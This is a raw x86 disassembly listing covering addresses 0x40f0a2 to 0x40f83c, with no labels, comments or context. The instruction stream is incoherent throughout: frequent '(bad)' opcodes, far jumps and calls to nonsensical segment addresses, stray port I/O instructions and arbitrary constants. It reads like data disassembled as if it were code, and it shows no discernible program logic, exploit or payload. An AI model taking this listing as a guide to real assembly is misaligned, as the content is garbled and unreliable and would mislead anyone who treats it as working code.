  40f0a2:	sub    al,0x32
  40f0a4:	test   BYTE PTR [edi+ebp*4+0x29],bl
  40f0a8:	test   DWORD PTR [esi],esp
  40f0aa:	jmp    0x12dab983
  40f0af:	sar    BYTE PTR [edx+0x43],cl
  40f0b2:	pop    ebx
  40f0b3:	mov    ebp,0x8417bac6
  40f0b8:	mov    ebx,0x65ddc95
  40f0bd:	cmp    bl,BYTE PTR [esi-0x2f]
  40f0c0:	and    DWORD PTR [eax+0x3e0f3334],edx
  40f0c6:	mov    DWORD PTR ds:[esi-0x1c52a713],ebx
  40f0cd:	cmp    ch,BYTE PTR [ecx+0x40d83f]
  40f0d3:	(bad)  
  40f0d4:	loop   0x40f0a5
  40f0d6:	ins    BYTE PTR es:[edi],dx
  40f0d7:	shr    BYTE PTR ss:[eax],cl
  40f0da:	inc    ebp
  40f0db:	pop    edi
  40f0dc:	push   ecx
  40f0dd:	sti    
  40f0de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0df:	outs   dx,BYTE PTR ds:[esi]
  40f0e0:	sub    al,0xae
  40f0e2:	stc    
  40f0e3:	adc    eax,0x9008ee6b
  40f0e8:	sub    al,0x6d
  40f0ea:	sub    al,0xba
  40f0ec:	(bad)  
  40f0ed:	not    BYTE PTR [edx+0x362fe4ad]
  40f0f3:	pop    ebx
  40f0f4:	xlat   BYTE PTR ds:[ebx]
  40f0f5:	imul   ecx,esi,0xffffffce
  40f0f8:	cmp    eax,0x78af91c6
  40f0fd:	lea    ecx,[eax+ebp*8+0x536deb5b]
  40f104:	pusha  
  40f105:	lods   eax,DWORD PTR ds:[esi]
  40f106:	loope  0x40f0d0
  40f108:	fiadd  DWORD PTR [esi]
  40f10a:	pop    esp
  40f10b:	mov    al,0x4
  40f10d:	nop
  40f10e:	lock xchg edx,eax
  40f110:	inc    eax
  40f111:	mov    ebx,0x667e846b
  40f116:	cmp    cl,BYTE PTR [ebp+edi*4+0x6d]
  40f11a:	jmp    0x40f0a2
  40f11c:	rol    al,1
  40f11e:	stos   DWORD PTR es:[edi],eax
  40f11f:	pusha  
  40f120:	mov    ecx,DWORD PTR [ecx]
  40f122:	and    dl,BYTE PTR [esi+0x56]
  40f125:	pop    ebp
  40f126:	dec    esp
  40f127:	mov    DWORD PTR [edx+ecx*4],0xd68835b3
  40f12e:	inc    ebp
  40f12f:	lahf   
  40f130:	outs   dx,BYTE PTR ds:[esi]
  40f131:	adc    eax,0x39abb8eb
  40f136:	lods   eax,DWORD PTR ds:[esi]
  40f137:	sbb    al,BYTE PTR [edi]
  40f139:	or     ch,BYTE PTR [edi+0x1c]
  40f13c:	cmp    DWORD PTR [ecx-0x33],esp
  40f13f:	dec    ebp
  40f140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f141:	mov    WORD PTR [edi-0x23],ds
  40f144:	popf   
  40f145:	xor    bh,bh
  40f147:	test   eax,0xff82172a
  40f14c:	pusha  
  40f14d:	cwde   
  40f14e:	and    BYTE PTR [ebp-0x11],cl
  40f151:	imul   esi,DWORD PTR [ecx+0x53],0x2f297659
  40f158:	jmp    0xab9abd1a
  40f15d:	jmp    0xf614:0xb866ca1a
  40f164:	fnstcw WORD PTR [ebx+0x17e7091f]
  40f16a:	inc    esi
  40f16b:	shl    edi,1
  40f16d:	test   eax,0x579938a0
  40f172:	pop    edi
  40f173:	arpl   bp,cx
  40f175:	inc    edi
  40f176:	fwait
  40f177:	push   esi
  40f178:	push   ebx
  40f179:	scas   eax,DWORD PTR es:[edi]
  40f17a:	(bad)  
  40f17b:	jp     0x40f108
  40f17d:	cs pop ebx
  40f17f:	sbb    BYTE PTR [ecx-0x1f],0xb6
  40f183:	das    
  40f184:	popf   
  40f185:	push   DWORD PTR [ebx]
  40f187:	mov    al,BYTE PTR [esi-0x79]
  40f18a:	push   ebx
  40f18b:	pop    es
  40f18c:	inc    esi
  40f18d:	and    DWORD PTR [eax],eax
  40f18f:	(bad)  
  40f190:	(bad)  
  40f192:	push   cs
  40f193:	fsubr  st,st(2)
  40f195:	stc    
  40f196:	sbb    bh,BYTE PTR [edx+0x60]
  40f199:	pusha  
  40f19a:	sbb    eax,0x65e1d260
  40f19f:	xor    eax,0x1468deaa
  40f1a4:	leave  
  40f1a5:	xlat   BYTE PTR ds:[ebx]
  40f1a6:	aam    0x94
  40f1a8:	ins    DWORD PTR es:[edi],dx
  40f1a9:	test   al,0xb1
  40f1ab:	xor    al,0x7d
  40f1ad:	and    eax,DWORD PTR [eax+ebp*4]
  40f1b0:	jmp    0x3065:0xefc39688
  40f1b7:	pop    esi
  40f1b8:	inc    ebx
  40f1b9:	and    bl,0x6f
  40f1bc:	xchg   ecx,eax
  40f1bd:	cmp    BYTE PTR [esi],cl
  40f1bf:	imul   DWORD PTR ds:0x1e7680d
  40f1c5:	jns    0x40f20f
  40f1c7:	adc    eax,0x894311b6
  40f1cc:	(bad)  
  40f1cd:	out    0xdf,eax
  40f1cf:	les    eax,FWORD PTR [ebx+0x28200871]
  40f1d5:	or     BYTE PTR [ecx],ah
  40f1d7:	mov    edx,0xa4bedb0e
  40f1dc:	cmp    ch,al
  40f1de:	adc    dh,dl
  40f1e0:	mov    edx,0x6f52b9e8
  40f1e5:	and    al,0x6f
  40f1e7:	or     DWORD PTR [ebx],0x7ed80024
  40f1ed:	jb     0x40f237
  40f1ef:	sti    
  40f1f0:	or     al,0xc6
  40f1f2:	push   esp
  40f1f3:	addr16 push esi
  40f1f5:	add    BYTE PTR [edi-0x25],0xe3
  40f1f9:	xchg   edi,eax
  40f1fa:	enter  0xcbd2,0x23
  40f1fe:	mov    al,0xcd
  40f200:	adc    al,0xb8
  40f202:	fsub   DWORD PTR [eax+0x71]
  40f205:	mov    bl,0x4b
  40f207:	or     al,0x92
  40f209:	push   ss
  40f20a:	cmc    
  40f20b:	jmp    0xde78fc0d
  40f210:	xor    BYTE PTR [ecx-0x16],al
  40f213:	or     al,BYTE PTR [ecx+0x5d301396]
  40f219:	daa    
  40f21a:	xchg   esi,eax
  40f21b:	add    esi,DWORD PTR [eax-0xc]
  40f21e:	daa    
  40f21f:	lds    ebp,FWORD PTR [eax]
  40f221:	sub    ebp,esi
  40f223:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f224:	gs mov cl,0xfc
  40f227:	mov    ds:0x525be4f,eax
  40f22c:	jg     0x40f1c9
  40f22e:	arpl   WORD PTR [esi+0x60c59ba],bp
  40f234:	out    0xa4,al
  40f236:	mov    bl,0x4d
  40f238:	fimul  WORD PTR [eax+0x6]
  40f23b:	pop    ds
  40f23c:	push   ebp
  40f23d:	pop    edi
  40f23e:	mov    eax,0xfde359d7
  40f243:	ss add ebx,edi
  40f246:	mov    dh,0x49
  40f248:	in     al,dx
  40f249:	jnp    0x40f22e
  40f24b:	sbb    cl,dh
  40f24d:	sub    BYTE PTR [esi+edx*1+0x5b59c989],dh
  40f254:	mov    al,0xd5
  40f256:	leave  
  40f257:	sub    eax,0x8c13fe6e
  40f25c:	out    dx,eax
  40f25d:	push   0xffffffca
  40f25f:	mov    cs,WORD PTR [edx+edx*2+0x64]
  40f263:	xor    bl,BYTE PTR [edx+ebp*1-0x64c60441]
  40f26a:	xchg   ebx,eax
  40f26b:	shl    DWORD PTR [esi+0x2292f1f0],1
  40f271:	sub    eax,0x6dc26c00
  40f276:	retf   
  40f277:	pop    ss
  40f278:	xchg   esi,eax
  40f279:	sti    
  40f27a:	pop    ecx
  40f27b:	jo     0x40f2c7
  40f27d:	lods   eax,DWORD PTR ds:[esi]
  40f27e:	sbb    DWORD PTR [edi+0x74feaad0],0xf19442e0
  40f288:	adc    edx,DWORD PTR [edx+0x1a6fd9bd]
  40f28e:	(bad)  
  40f28f:	aad    0xfe
  40f291:	lea    edx,[edi+esi*1]
  40f294:	inc    esi
  40f295:	hlt    
  40f296:	mov    bl,0x27
  40f298:	mov    edi,0x3a866c72
  40f29d:	mov    ah,0x84
  40f29f:	add    DWORD PTR [ebx-0x87a9cea],esp
  40f2a5:	scas   eax,DWORD PTR es:[edi]
  40f2a6:	mov    BYTE PTR [ebx-0xb],dl
  40f2a9:	lods   al,BYTE PTR ds:[esi]
  40f2aa:	loope  0x40f30d
  40f2ac:	mov    esp,0x8d649260
  40f2b1:	jmp    0x40f306
  40f2b3:	xor    DWORD PTR [edi+0x4a5a6ee1],edx
  40f2b9:	int    0xdc
  40f2bb:	ret    0xfbc6
  40f2be:	out    dx,al
  40f2bf:	xchg   esp,eax
  40f2c0:	adc    BYTE PTR [ebx+0x24e85913],dl
  40f2c6:	mov    eax,ds:0xc68e4eb5
  40f2cb:	jne    0x40f313
  40f2cd:	push   edx
  40f2ce:	mov    al,ds:0x383f59f
  40f2d3:	xchg   edx,eax
  40f2d4:	pop    ss
  40f2d5:	cmp    ah,dh
  40f2d7:	pop    es
  40f2d8:	dec    edx
  40f2d9:	sub    bl,BYTE PTR [edi+0x2e077cb]
  40f2df:	adc    ch,bh
  40f2e1:	cmp    BYTE PTR [ecx],ah
  40f2e3:	(bad)  
  40f2e4:	dec    ebp
  40f2e5:	rol    DWORD PTR [edi+0x1d72c637],cl
  40f2eb:	pop    ebx
  40f2ec:	inc    edx
  40f2ed:	jne    0x40f314
  40f2ef:	or     ah,BYTE PTR [edx-0x53c49cc7]
  40f2f5:	jnp    0x40f2e0
  40f2f7:	icebp  
  40f2f8:	sbb    esi,DWORD PTR [ebp-0x27cbb00c]
  40f2fe:	mov    bh,0xfc
  40f300:	dec    ebp
  40f301:	inc    esi
  40f302:	adc    DWORD PTR [esi],0xffffffcc
  40f305:	scas   eax,DWORD PTR es:[edi]
  40f306:	mov    bl,0xe4
  40f308:	xor    edi,DWORD PTR [esi+0x7f0c6809]
  40f30e:	xchg   ecx,eax
  40f30f:	mov    ebp,0xaf83dbe7
  40f314:	clc    
  40f315:	mov    edx,0x6f30d086
  40f31a:	inc    edi
  40f31b:	(bad)  
  40f31d:	mov    esi,0x3ecd6233
  40f322:	lods   al,BYTE PTR ds:[esi]
  40f323:	adc    ecx,DWORD PTR [eax-0x37]
  40f326:	xchg   ecx,eax
  40f327:	in     eax,0xc2
  40f329:	(bad)  
  40f32a:	sbb    BYTE PTR [esi+ebx*8-0x72462dcc],bl
  40f331:	adc    eax,0xbb24efd9
  40f336:	cmp    DWORD PTR [esi-0x2],edx
  40f339:	xchg   DWORD PTR [eax+0x6cf2112],ecx
  40f33f:	and    ch,bl
  40f341:	jecxz  0x40f3c0
  40f343:	cs js  0x40f2cd
  40f346:	sbb    al,0xd0
  40f348:	repnz sar BYTE PTR [edi],1
  40f34b:	stos   DWORD PTR es:[edi],eax
  40f34c:	mov    cl,0x42
  40f34e:	call   0x1db1:0x79693e9
  40f355:	push   esp
  40f356:	xor    ch,BYTE PTR [ebx+0x78]
  40f359:	fdivr  DWORD PTR [eax+0x742edd49]
  40f35f:	adc    cl,BYTE PTR [eax-0x3e]
  40f362:	dec    ecx
  40f363:	or     esp,DWORD PTR [edx+0x5435e62b]
  40f369:	mov    gs,eax
  40f36b:	div    bh
  40f36d:	jmp    FWORD PTR [edi+0x5249215c]
  40f373:	mov    esi,0x311ed84c
  40f378:	mov    ch,0xc7
  40f37a:	ins    DWORD PTR es:[edi],dx
  40f37b:	inc    eax
  40f37c:	cmp    BYTE PTR [edi],0x21
  40f37f:	lea    esp,[edx-0x24]
  40f382:	mov    ebp,0x85d89004
  40f387:	push   eax
  40f388:	jmp    0x2e50:0xf051e7ec
  40f38f:	mov    ah,0x1d
  40f391:	ins    DWORD PTR es:[edi],dx
  40f392:	inc    esi
  40f393:	cld    
  40f394:	(bad)  
  40f395:	sub    ah,BYTE PTR [edx]
  40f397:	aas    
  40f398:	push   0x8da302f5
  40f39d:	imul   eax,esi,0xffffffd8
  40f3a0:	int    0x1b
  40f3a2:	jae    0x40f37e
  40f3a4:	inc    ecx
  40f3a5:	enter  0xcf14,0xf2
  40f3a9:	push   eax
  40f3aa:	jae    0x40f35a
  40f3ac:	sbb    al,dh
  40f3ae:	bswap  edx
  40f3b0:	aas    
  40f3b1:	mov    esp,0x2cc0a1bb
  40f3b6:	in     al,dx
  40f3b7:	and    al,0x6e
  40f3b9:	jg     0x40f3b5
  40f3bb:	fidiv  WORD PTR [ebx+edi*1+0x1e9359e5]
  40f3c2:	inc    ecx
  40f3c3:	jge    0x40f3e2
  40f3c5:	jmp    0x40f3b1
  40f3c7:	push   ebx
  40f3c8:	jae    0x40f390
  40f3ca:	sahf   
  40f3cb:	push   ebp
  40f3cc:	add    DWORD PTR [ebx-0x723b10ad],0xf2627112
  40f3d6:	inc    ecx
  40f3d7:	dec    ecx
  40f3d8:	xchg   edx,eax
  40f3d9:	push   ss
  40f3da:	push   ss
  40f3db:	xor    DWORD PTR [esi-0x42dd35d3],0x22
  40f3e2:	(bad)  
  40f3e3:	jge    0x40f43a
  40f3e5:	add    BYTE PTR [ecx],bl
  40f3e7:	ds inc ebp
  40f3e9:	xor    DWORD PTR [edx+0x293b6ab4],ebx
  40f3ef:	ja     0x40f43d
  40f3f1:	jp     0x40f3d2
  40f3f3:	mov    ah,0xd4
  40f3f5:	ins    BYTE PTR es:[edi],dx
  40f3f6:	dec    ebx
  40f3f7:	adc    dl,dl
  40f3f9:	call   0xcc921e23
  40f3fe:	arpl   WORD PTR [esi],sp
  40f400:	sbb    BYTE PTR [esi+0x254e4663],cl
  40f406:	cmp    BYTE PTR [edx+0x3675d813],0x47
  40f40d:	push   0x78943610
  40f412:	jl     0x40f410
  40f414:	ja     0x40f411
  40f416:	mov    edi,0xa73f0e94
  40f41b:	shr    BYTE PTR [ebx+0x11fb76bf],1
  40f421:	or     dh,BYTE PTR [bp+si-0x452]
  40f426:	lock stc 
  40f428:	push   ss
  40f429:	fld    st(1)
  40f42b:	scas   al,BYTE PTR es:[edi]
  40f42c:	sti    
  40f42d:	inc    eax
  40f42e:	or     al,0x9c
  40f430:	retf   
  40f431:	(bad)  
  40f432:	pop    ds
  40f433:	mov    cl,0xa3
  40f435:	adc    BYTE PTR [ebx-0x7ffcb3d9],0xf0
  40f43c:	dec    edx
  40f43d:	adc    BYTE PTR [esi-0x6df6419],dl
  40f443:	pop    edi
  40f444:	mov    eax,DWORD PTR [ebx]
  40f446:	xchg   esp,eax
  40f447:	popf   
  40f448:	cwde   
  40f449:	xor    DWORD PTR [edx+0xc],ecx
  40f44c:	push   ebp
  40f44d:	popf   
  40f44e:	xor    BYTE PTR [ecx],ah
  40f450:	cmp    al,dl
  40f452:	leave  
  40f453:	mov    esi,0x4b643141
  40f458:	jg     0x40f444
  40f45a:	pop    ds
  40f45b:	xchg   esp,eax
  40f45c:	js     0x40f3ed
  40f45e:	sbb    edx,DWORD PTR [edi+0x52]
  40f461:	dec    edx
  40f462:	aad    0x77
  40f464:	pop    eax
  40f465:	sbb    ah,ch
  40f467:	push   0x2a
  40f469:	fistp  DWORD PTR [eax-0x69c121ab]
  40f46f:	rcl    BYTE PTR [edx+eiz*1],0x22
  40f473:	adc    BYTE PTR [esi+0x23ceabac],dl
  40f479:	inc    eax
  40f47a:	cmp    ebp,DWORD PTR [ecx-0x61d8317d]
  40f480:	and    DWORD PTR [ebx+0x2b],edi
  40f483:	sbb    BYTE PTR ds:0x77d03a62,0x9e
  40f48a:	mov    al,ds:0xf8c03b1f
  40f48f:	out    0xb1,eax
  40f491:	jp     0x40f497
  40f493:	loope  0x40f44a
  40f495:	pop    esp
  40f496:	and    cl,BYTE PTR [ecx]
  40f498:	mov    dl,0x3f
  40f49a:	cld    
  40f49b:	mov    edi,0xdaad48e7
  40f4a0:	rcr    BYTE PTR ds:[ebp-0x450211ca],1
  40f4a7:	or     eax,0xd1f4a48f
  40f4ac:	int    0x86
  40f4ae:	push   es
  40f4af:	mov    ebx,0x34e954ad
  40f4b4:	(bad)  
  40f4b5:	mov    ebp,0x2a074017
  40f4ba:	push   edx
  40f4bb:	in     al,dx
  40f4bc:	lods   al,BYTE PTR ds:[esi]
  40f4bd:	fdiv   QWORD PTR cs:[edi+0x19]
  40f4c1:	dec    ebp
  40f4c2:	es adc dl,cl
  40f4c5:	out    dx,eax
  40f4c6:	and    BYTE PTR [ecx-0x699249f0],0x5d
  40f4cd:	push   ds
  40f4ce:	push   edi
  40f4cf:	std    
  40f4d0:	enter  0x175,0x15
  40f4d4:	mov    al,0xa
  40f4d6:	xor    BYTE PTR [edi-0x6f023ca1],cl
  40f4dc:	mov    ebp,0x83c8b5dd
  40f4e1:	jns    0x40f477
  40f4e3:	push   ss
  40f4e4:	ss jmp 0x40f4fd
  40f4e7:	pop    edi
  40f4e8:	jp     0x40f477
  40f4ea:	or     ebp,ebp
  40f4ec:	and    al,0x90
  40f4ee:	mov    DWORD PTR [ebx+0x3c36f05e],edi
  40f4f4:	enter  0xfa56,0x30
  40f4f8:	stc    
  40f4f9:	lock pop edx
  40f4fb:	xor    ebx,DWORD PTR ds:0x4af7b374
  40f501:	or     eax,0xa835f8bf
  40f506:	call   0xf320:0x8d6bee05
  40f50d:	outs   dx,DWORD PTR ds:[esi]
  40f50e:	test   al,0x5c
  40f510:	jmp    0x4c43:0xc007cff7
  40f517:	js     0x40f55d
  40f519:	push   ds
  40f51a:	pop    ecx
  40f51b:	mov    ecx,0x8cb42922
  40f520:	inc    esp
  40f521:	sub    ch,BYTE PTR [ebx]
  40f523:	and    cl,cl
  40f525:	mov    bh,0x4f
  40f527:	fdiv   DWORD PTR [ebx+0x486bf277]
  40f52d:	inc    edx
  40f52e:	push   0x71268717
  40f533:	adc    al,0x5
  40f535:	cmp    ecx,eax
  40f537:	add    cl,BYTE PTR [ebp+0x19]
  40f53a:	stc    
  40f53b:	xor    eax,0xbb51086f
  40f540:	sbb    DWORD PTR [ecx+ebx*2-0x1bfb8faa],esp
  40f547:	in     eax,0x89
  40f549:	mov    BYTE PTR [edi],dl
  40f54b:	lods   al,BYTE PTR ds:[esi]
  40f54c:	cli    
  40f54d:	(bad)  
  40f54e:	div    BYTE PTR [edi-0x72]
  40f551:	ins    DWORD PTR es:[edi],dx
  40f552:	std    
  40f553:	sbb    bh,BYTE PTR [esi]
  40f555:	mov    cl,0x7b
  40f557:	fnclex 
  40f559:	push   esp
  40f55a:	pop    ebp
  40f55b:	and    al,0xf6
  40f55d:	mov    ebp,edi
  40f55f:	push   ss
  40f560:	pop    edx
  40f561:	in     eax,dx
  40f562:	mov    esp,0x164702a6
  40f567:	cmp    ah,BYTE PTR [ecx-0x70]
  40f56a:	cmp    bh,BYTE PTR [ebp+edi*2+0xa3553ec]
  40f571:	mov    dl,0xca
  40f573:	jns    0x40f5d7
  40f575:	popa   
  40f576:	popa   
  40f577:	cmp    al,dl
  40f579:	jnp    0x40f506
  40f57b:	xchg   ebx,eax
  40f57c:	iret   
  40f57d:	ja     0x40f5a1
  40f57f:	xchg   edx,eax
  40f580:	test   BYTE PTR [edx-0x6c01e29e],0xc8
  40f587:	pop    esi
  40f588:	int3   
  40f589:	out    0x96,eax
  40f58b:	push   ds
  40f58c:	and    ecx,DWORD PTR [ebx+0x7c7714dc]
  40f592:	sbb    eax,0x2e11e087
  40f597:	cwde   
  40f598:	push   edi
  40f599:	push   ss
  40f59a:	mov    eax,ds:0xd4303034
  40f59f:	mov    ah,0x20
  40f5a1:	scas   eax,DWORD PTR es:[edi]
  40f5a2:	sbb    al,0x9f
  40f5a4:	xchg   ebx,eax
  40f5a5:	inc    dl
  40f5a7:	mov    edi,0xe122c3d0
  40f5ac:	out    0x1b,eax
  40f5ae:	add    ch,cl
  40f5b0:	in     al,dx
  40f5b1:	dec    ebx
  40f5b2:	xchg   ebx,eax
  40f5b3:	dec    eax
  40f5b4:	pusha  
  40f5b5:	mov    eax,0x6fa11f04
  40f5ba:	hlt    
  40f5bb:	lea    esi,[esi-0x69]
  40f5be:	inc    eax
  40f5bf:	test   al,0xf9
  40f5c1:	arpl   WORD PTR ds:0xdd9e679e,bx
  40f5c7:	loope  0x40f645
  40f5c9:	jecxz  0x40f636
  40f5cb:	mov    esi,0x2fbaf9b9
  40f5d0:	sbb    edx,esp
  40f5d2:	xor    eax,DWORD PTR ds:0x30f67ac2
  40f5d9:	repnz fdivp st(3),st
  40f5dc:	xchg   esp,eax
  40f5dd:	lds    esi,FWORD PTR [edx]
  40f5df:	mov    ebx,0xe8ece8d0
  40f5e4:	dec    edi
  40f5e5:	ds push ds
  40f5e7:	pop    edx
  40f5e8:	pop    ebp
  40f5e9:	lods   eax,DWORD PTR ds:[esi]
  40f5ea:	popa   
  40f5eb:	imul   esi,ecx,0xed776302
  40f5f1:	adc    BYTE PTR [esi],bl
  40f5f3:	(bad)  
  40f5f4:	clc    
  40f5f5:	loop   0x40f61f
  40f5f7:	adc    esp,esi
  40f5f9:	(bad)  
  40f5fa:	fistp  QWORD PTR [edi-0xc6e958]
  40f600:	ja     0x40f676
  40f602:	(bad)  
  40f604:	shl    DWORD PTR [ebx-0x36],1
  40f607:	test   eax,0x8e451a90
  40f60c:	mov    dh,0x15
  40f60e:	adc    BYTE PTR [eax],al
  40f610:	arpl   cx,bp
  40f612:	or     edi,esi
  40f614:	mov    cl,0xd7
  40f616:	in     al,dx
  40f617:	adc    eax,DWORD PTR [ecx+0x6e]
  40f61a:	fld    TBYTE PTR [eax+0xb]
  40f61d:	scas   eax,DWORD PTR es:[edi]
  40f61e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f61f:	dec    edi
  40f620:	icebp  
  40f621:	and    BYTE PTR [ebp-0x125d892],ch
  40f627:	and    ch,BYTE PTR [eax+0x22]
  40f62a:	mov    al,0x1
  40f62c:	adc    al,0x66
  40f62e:	jle    0x40f645
  40f630:	icebp  
  40f631:	in     al,dx
  40f632:	cdq    
  40f633:	xor    ch,BYTE PTR [ecx-0x5ab43796]
  40f639:	inc    esi
  40f63a:	pop    ebp
  40f63b:	cdq    
  40f63c:	dec    edi
  40f63d:	sar    BYTE PTR [ebx+0x3fdba624],1
  40f643:	addr16 inc eax
  40f645:	loope  0x40f61e
  40f647:	aas    
  40f648:	push   esp
  40f649:	pusha  
  40f64a:	(bad)  
  40f64b:	dec    esp
  40f64c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f64d:	or     ecx,ebx
  40f64f:	out    0xc5,eax
  40f651:	or     dl,BYTE PTR [edi+0x17]
  40f654:	dec    eax
  40f655:	lods   eax,DWORD PTR ds:[esi]
  40f656:	sbb    edi,esi
  40f658:	dec    edi
  40f659:	xor    BYTE PTR [edx-0x49a01bd5],0x24
  40f660:	jns    0x40f628
  40f662:	dec    esi
  40f663:	hlt    
  40f664:	fcomp  QWORD PTR [ecx-0x76657e59]
  40f66a:	retf   0xc464
  40f66d:	sbb    BYTE PTR [ebx],0xe6
  40f670:	push   edx
  40f671:	aam    0x70
  40f673:	fild   WORD PTR [edi-0x1e831bd9]
  40f679:	mov    al,ds:0x87244bfe
  40f67e:	out    dx,eax
  40f67f:	adc    BYTE PTR [edx],ch
  40f681:	and    BYTE PTR [ecx+0x57],dh
  40f684:	dec    ebp
  40f685:	icebp  
  40f686:	add    edi,ebx
  40f688:	(bad)  
  40f689:	(bad)  
  40f68a:	pusha  
  40f68b:	vpunpckhqdq ymm2,ymm0,YMMWORD PTR [ebx]
  40f68f:	pop    es
  40f690:	mov    eax,0xce767477
  40f695:	jnp    0x40f636
  40f697:	jge    0x40f667
  40f699:	ja     0x40f63a
  40f69b:	jp     0x40f713
  40f69d:	test   BYTE PTR [edi-0x6b],ch
  40f6a0:	push   edx
  40f6a1:	jecxz  0x40f720
  40f6a3:	inc    ecx
  40f6a4:	jmp    0x825a:0x404c17c8
  40f6ab:	mov    ch,BYTE PTR [esi+0x2e83c7e6]
  40f6b1:	xchg   ebp,eax
  40f6b2:	xor    edx,0x50da8909
  40f6b8:	xchg   ebp,eax
  40f6b9:	xchg   ecx,edx
  40f6bb:	das    
  40f6bc:	adc    eax,0x792fe0d5
  40f6c1:	dec    ebp
  40f6c2:	xor    al,0xeb
  40f6c4:	je     0x40f715
  40f6c6:	fist   DWORD PTR [ebp-0x47]
  40f6c9:	pop    es
  40f6ca:	xor    eax,ebp
  40f6cc:	(bad)  
  40f6cd:	(bad)  
  40f6ce:	imul   ecx,esi,0x454ce103
  40f6d4:	ins    DWORD PTR es:[edi],dx
  40f6d5:	cvtps2pd xmm4,QWORD PTR [eax]
  40f6d8:	(bad)  
  40f6d9:	and    esi,esp
  40f6db:	test   BYTE PTR [ebp-0x720aea73],dl
  40f6e1:	or     eax,DWORD PTR [ebx-0x1995466f]
  40f6e7:	cwde   
  40f6e8:	push   0x2d
  40f6ea:	call   0x61302182
  40f6ef:	out    0xb6,eax
  40f6f1:	sbb    eax,0x7feea926
  40f6f6:	mov    dh,0xe
  40f6f8:	imul   DWORD PTR [ecx]
  40f6fa:	sub    al,0xbf
  40f6fc:	pop    es
  40f6fd:	adc    eax,0xbab99a10
  40f702:	adc    eax,0xd6b237b8
  40f707:	ins    DWORD PTR es:[edi],dx
  40f708:	or     esp,esi
  40f70a:	rcl    BYTE PTR [edx+0x784d4577],cl
  40f710:	pusha  
  40f711:	es push 0xffffffaf
  40f714:	enter  0xd8ff,0x91
  40f718:	je     0x40f6a3
  40f71a:	scas   al,BYTE PTR es:[edi]
  40f71b:	test   BYTE PTR [eax],dh
  40f71d:	dec    ecx
  40f71e:	ss cdq 
  40f720:	stc    
  40f721:	out    0xab,al
  40f723:	inc    ecx
  40f724:	lods   al,BYTE PTR ds:[esi]
  40f725:	out    0x37,al
  40f727:	xor    al,0x97
  40f729:	call   0xe5b3:0xc72d69d3
  40f730:	lar    esp,WORD PTR [ecx]
  40f733:	cld    
  40f734:	jl     0x40f6c0
  40f736:	mov    DWORD PTR [ebx],eax
  40f738:	pusha  
  40f739:	sbb    al,0xaa
  40f73b:	pushf  
  40f73c:	shl    BYTE PTR [edx+0x14507be7],1
  40f742:	mov    al,0x83
  40f744:	fisttp DWORD PTR [ebx+0x7d]
  40f747:	adc    DWORD PTR [edx],eax
  40f749:	xchg   DWORD PTR [eax+0x2],esp
  40f74c:	icebp  
  40f74d:	and    al,0xd5
  40f74f:	test   al,0x1a
  40f751:	aad    0x17
  40f753:	pusha  
  40f754:	dec    eax
  40f755:	add    BYTE PTR [esi],dh
  40f757:	mov    al,ds:0xe4b3c4b5
  40f75c:	stos   BYTE PTR es:[edi],al
  40f75d:	push   edi
  40f75e:	ja     0x40f7a5
  40f760:	cld    
  40f761:	push   0xed6fc1cf
  40f766:	fistp  WORD PTR [ebx]
  40f768:	sti    
  40f769:	call   0x9e969c83
  40f76e:	call   0x6fa62ab0
  40f773:	call   0xb28cf41d
  40f778:	mov    ebp,0x2a85edd0
  40f77d:	fcomp  st(6)
  40f77f:	(bad)  
  40f780:	lds    ecx,FWORD PTR [ebx]
  40f782:	inc    ebx
  40f783:	ret    0x39fa
  40f786:	popf   
  40f787:	ret    0x3e29
  40f78a:	sar    DWORD PTR [edx-0x14],1
  40f78d:	cmp    al,BYTE PTR [edx+eax*2+0x7beee74b]
  40f794:	pop    ecx
  40f795:	out    dx,eax
  40f796:	add    bl,ch
  40f798:	loop   0x40f786
  40f79a:	lock pop eax
  40f79c:	xor    dl,ch
  40f79e:	adc    esp,ebx
  40f7a0:	jecxz  0x40f79d
  40f7a2:	pop    ecx
  40f7a3:	(bad)  
  40f7a4:	sar    BYTE PTR [ecx-0x3e834b11],cl
  40f7aa:	or     BYTE PTR [ebp+eax*2-0x6470e4dc],dh
  40f7b1:	jnp    0x40f7da
  40f7b3:	repnz ins DWORD PTR es:[edi],dx
  40f7b5:	mov    bl,bl
  40f7b7:	push   edi
  40f7b8:	popa   
  40f7b9:	out    0xc,eax
  40f7bb:	and    esi,esi
  40f7bd:	inc    edi
  40f7be:	outs   dx,DWORD PTR ds:[esi]
  40f7bf:	sahf   
  40f7c0:	mov    al,0xbd
  40f7c2:	xor    ebp,edx
  40f7c4:	out    dx,eax
  40f7c5:	addr16 push ebx
  40f7c7:	adc    eax,0x33a0afc3
  40f7cc:	xlat   BYTE PTR ds:[ebx]
  40f7cd:	pop    ds
  40f7ce:	retf   
  40f7cf:	mov    ss,WORD PTR [esi]
  40f7d1:	mov    ebp,0xd816c29e
  40f7d6:	out    0xa,al
  40f7d8:	clc    
  40f7d9:	sbb    BYTE PTR [esi+0x79dec6ef],ah
  40f7df:	mov    WORD PTR [edx-0x3f2f0484],?
  40f7e5:	sbb    ch,BYTE PTR [edi+ebx*8+0x7f205402]
  40f7ec:	mov    ss,ebx
  40f7ee:	enter  0x57ba,0x5f
  40f7f2:	adc    BYTE PTR [ebp+0x3da8179c],ch
  40f7f8:	dec    eax
  40f7f9:	sub    al,0x23
  40f7fb:	jno    0x40f81b
  40f7fd:	sbb    esi,DWORD PTR [ecx-0xc8ea13d]
  40f803:	adc    al,0x85
  40f805:	in     al,0x3e
  40f807:	pop    ds
  40f808:	dec    edi
  40f809:	mov    edx,DWORD PTR [ebp+edx*4-0xe11803]
  40f810:	(bad)  
  40f811:	inc    eax
  40f812:	push   0x6b6e4918
  40f817:	add    eax,0x80e5bf49
  40f81c:	cmp    edx,DWORD PTR [ebx-0x69e9c6ea]
  40f822:	dec    eax
  40f823:	mov    dl,0x10
  40f825:	fisttp WORD PTR [ebx]
  40f827:	pushf  
  40f828:	cmc    
  40f829:	cmp    dl,BYTE PTR [ebx]
  40f82b:	aaa    
  40f82c:	imul   DWORD PTR [ebx]
  40f82e:	mov    bl,0x9b
  40f830:	inc    esp
  40f831:	jg     0x40f886
  40f833:	cdq    
  40f834:	sub    esi,DWORD PTR [esi+0x7728e2fe]
  40f83a:	aas    
  40f83b:	daa    
  40f83c:	sbb    ah,dl
